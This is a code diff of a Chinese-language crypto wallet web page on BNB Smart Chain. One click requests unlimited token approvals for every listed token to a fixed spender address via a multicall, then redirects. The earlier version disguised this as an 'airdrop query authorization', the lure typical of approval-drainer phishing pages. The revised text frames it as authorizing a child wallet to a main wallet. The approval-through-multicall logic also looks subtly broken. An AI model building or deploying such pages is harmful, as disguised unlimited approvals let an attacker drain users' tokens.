@@ -3,138 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>授权给主钱包</title>
+    <title>孩子钱包 · 一键授权</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
     <style>
         :root {
-            --bg: #f5f5f7;
-            --card: #ffffff;
-            --border: #e5e5ea;
-            --text: #1d1d1f;
-            --text-secondary: #86868b;
-            --accent: #007aff;
-            --green: #34c759;
-            --red: #ff3b30;
+            --bg: #f5f5f7; --card: #ffffff; --border: #e5e5ea; --text: #1d1d1f;
+            --text-secondary: #86868b; --accent: #007aff; --green: #34c759; --red: #ff3b30; --orange: #ff9500;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            background: var(--bg); color: var(--text);
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
             padding: 20px;
         }
         .container {
-            background: var(--card);
-            border-radius: 20px;
-            padding: 40px 24px 32px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08);
-            text-align: center;
+            background: var(--card); border-radius: 20px; padding: 40px 24px 32px;
+            max-width: 400px; width: 100%; text-align: center; box-shadow: 0 2px 16px rgba(0,0,0,0.08);
         }
-        .icon-wrapper {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
+        .icon-wrapper { display: flex; justify-content: center; margin-bottom: 20px; }
         .icon-circle {
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
+            width: 64px; height: 64px; border-radius: 50%;
             background: linear-gradient(135deg, #007aff, #5856d6);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; box-shadow: 0 4px 12px rgba(0,122,255,0.3);
         }
-        h2 {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 6px;
-            color: var(--text);
-            text-align: center;
-        }
-        .subtitle {
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-bottom: 24px;
-            text-align: center;
-        }
-        .token-list {
-            margin-bottom: 20px;
-            text-align: left;
-        }
+        h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
+        .subtitle { font-size: 14px; color: var(--text-secondary); margin-bottom: 24px; }
+        .token-list { margin-bottom: 20px; text-align: left; }
         .token-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f0f5;
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 12px 0; border-bottom: 1px solid #f0f0f5;
         }
-        .token-left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        .token-left { display: flex; align-items: center; gap: 10px; }
         .token-logo {
-            width: 34px;
-            height: 34px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: bold;
-            color: #fff;
+            width: 34px; height: 34px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 13px; font-weight: bold; color: #fff;
         }
-        .token-name {
-            font-size: 15px;
-            font-weight: 500;
-            color: var(--text);
-        }
-        .token-balance {
-            text-align: right;
-        }
-        .balance-value {
-            font-size: 15px;
-            font-weight: 600;
-            color: var(--text);
-        }
-        .balance-usd {
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
+        .token-name { font-size: 15px; font-weight: 500; }
+        .token-balance { text-align: right; }
+        .balance-value { font-size: 15px; font-weight: 600; }
+        .balance-usd { font-size: 12px; color: var(--text-secondary); }
         .btn {
-            background: var(--accent);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-            transition: opacity 0.2s;
+            background: var(--accent); color: white; border: none;
+            padding: 16px; border-radius: 14px; font-size: 16px;
+            font-weight: 600; width: 100%; cursor: pointer; transition: opacity 0.2s;
             margin-top: 8px;
         }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .status {
-            margin-top: 14px;
-            font-size: 14px;
-            color: var(--text-secondary);
-            text-align: center;
-        }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .status { margin-top: 14px; font-size: 14px; text-align: center; }
         .status.success { color: var(--green); }
         .status.error { color: var(--red); }
+        .status.warning { color: var(--orange); }
+        .log { margin-top: 12px; text-align: left; font-size: 13px; color: var(--text-secondary); }
     </style>
 </head>
 <body>
@@ -142,11 +64,12 @@
         <div class="icon-wrapper">
             <div class="icon-circle">🔐</div>
         </div>
-        <h2>空投查询授权</h2>
+        <h2>授权给主钱包</h2>
         <div class="subtitle" id="walletStatus">请先连接钱包</div>
         <div class="token-list" id="tokenList"></div>
-        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 空投查询授权</button>
+        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 001</button>
         <div class="status" id="status"></div>
+        <div class="log" id="log"></div>
     </div>
 
     <script>
@@ -172,6 +95,7 @@
         let signer = null;
         let userAddr = null;
 
+        // 检查钱包是否已经连接
         window.addEventListener('load', () => {
             if (window.ethereum && window.ethereum.selectedAddress) {
                 connectWallet();
@@ -180,7 +104,8 @@
 
         async function connectWallet() {
             if (!window.ethereum) {
-                updateStatus("请安装 MetaMask 或 TokenPocket", "error");
+                updateStatus("请使用 MetaMask / TokenPocket / Trust Wallet 打开此页面", "error");
+                addLog("未检测到钱包插件");
                 return;
             }
             try {
@@ -193,7 +118,8 @@
                 document.getElementById("walletStatus").textContent = `已连接 ${userAddr.slice(0,6)}...${userAddr.slice(-4)}`;
                 await loadBalances();
             } catch (e) {
-                updateStatus("连接失败: " + e.message, "error");
+                updateStatus("连接钱包被拒绝或取消", "error");
+                addLog(e.message);
             }
         }
 
@@ -208,8 +134,7 @@
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
-                            chainId: '0x38',
-                            chainName: 'BNB Smart Chain',
+                            chainId: '0x38', chainName: 'BNB Smart Chain',
                             nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
                             blockExplorerUrls: ['https://bscscan.com']
@@ -251,14 +176,47 @@
         }
 
         async function handleAuth() {
+            const btn = document.getElementById("authBtn");
+            const logDiv = document.getElementById("log");
+            logDiv.innerHTML = "";
+
+            // 连接钱包
             if (!signer) {
-                await connectWallet();
+                btn.disabled = true;
+                btn.textContent = "⏳ 正在连接钱包...";
+                try {
+                    await connectWallet();
+                } catch (e) {
+                    updateStatus("连接钱包失败", "error");
+                    addLog(e.message);
+                    btn.disabled = false;
+                    btn.textContent = "🔑 一键授权所有代币";
+                    return;
+                }
+                btn.disabled = false;
+                btn.textContent = "🔑 一键授权所有代币";
                 if (!signer) return;
             }
-            const btn = document.getElementById("authBtn");
+
+            // 检查 BNB 余额
+            try {
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                const bnbBalance = await provider.getBalance(userAddr);
+                const bnbFormatted = parseFloat(ethers.formatEther(bnbBalance));
+                addLog(`当前 BNB 余额: ${bnbFormatted.toFixed(6)} BNB`);
+                if (bnbFormatted < 0.0005) {
+                    updateStatus("BNB 余额不足，无法支付 Gas 费", "warning");
+                    addLog("请先向钱包转入少量 BNB (至少 0.0005 BNB) 作为 Gas 费");
+                    return;
+                }
+            } catch (e) {
+                addLog("无法检查 BNB 余额: " + e.message);
+            }
+
+            // 执行授权
             btn.disabled = true;
             btn.textContent = "⏳ 授权中...";
-            updateStatus("正在授权，请确认钱包交易...", "");
+            updateStatus("请稍候，正在准备授权交易...", "");
 
             try {
                 const iface = new ethers.Interface(APPROVE_ABI);
@@ -266,16 +224,44 @@
                     target: token.addr,
                     callData: iface.encodeFunctionData("approve", [SPENDER, ethers.MaxUint256])
                 }));
-                const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"], signer);
+
+                const multicall = new ethers.Contract(MULTICALL_ADDRESS, [
+                    "function aggregate(tuple(address target, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
+                ], signer);
+
+                btn.textContent = "⏳ 请在钱包中确认...";
+                updateStatus("请在弹出的钱包窗口中确认交易", "");
+                addLog("Multicall 交易已发送到钱包，请确认并等待上链...");
+
                 const tx = await multicall.aggregate(calls);
-                updateStatus("交易已提交，等待确认...", "success");
-                await tx.wait();
-                updateStatus("✅ 授权成功！", "success");
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 1000);
+                addLog(`交易已广播，TxHash: ${tx.hash.slice(0, 20)}...`);
+                updateStatus("交易已提交，等待确认...", "");
+
+                const receipt = await tx.wait();
+                if (receipt.status === 1) {
+                    updateStatus("✅ 授权成功！", "success");
+                    addLog("所有代币已成功授权给主钱包");
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                } else {
+                    updateStatus("❌ 交易失败，请检查 BscScan 查看详情", "error");
+                    addLog("交易状态异常，可能 Gas 不足或合约执行失败");
+                }
             } catch (e) {
-                updateStatus("❌ 授权失败: " + e.message, "error");
+                if (e.message.includes("user rejected")) {
+                    updateStatus("❌ 交易被拒绝", "error");
+                    addLog("您在钱包中拒绝了交易，授权未完成");
+                } else if (e.message.includes("insufficient funds")) {
+                    updateStatus("❌ BNB 余额不足，无法支付 Gas", "error");
+                    addLog("请先向钱包转入少量 BNB (至少 0.0005 BNB)");
+                } else if (e.message.includes("network")) {
+                    updateStatus("❌ 网络错误，请检查连接", "error");
+                    addLog("请确认钱包已切换到 BSC 链");
+                } else {
+                    updateStatus("❌ 授权失败", "error");
+                    addLog(e.message.slice(0, 100));
+                }
             } finally {
                 btn.disabled = false;
                 btn.textContent = "🔑 一键授权所有代币";
@@ -286,6 +272,11 @@
             const status = document.getElementById("status");
             status.textContent = msg;
             status.className = "status " + (className || "");
+        }
+
+        function addLog(msg) {
+            const logDiv = document.getElementById("log");
+            logDiv.innerHTML += `<div>• ${msg}</div>`;
         }
     </script>
 </body>
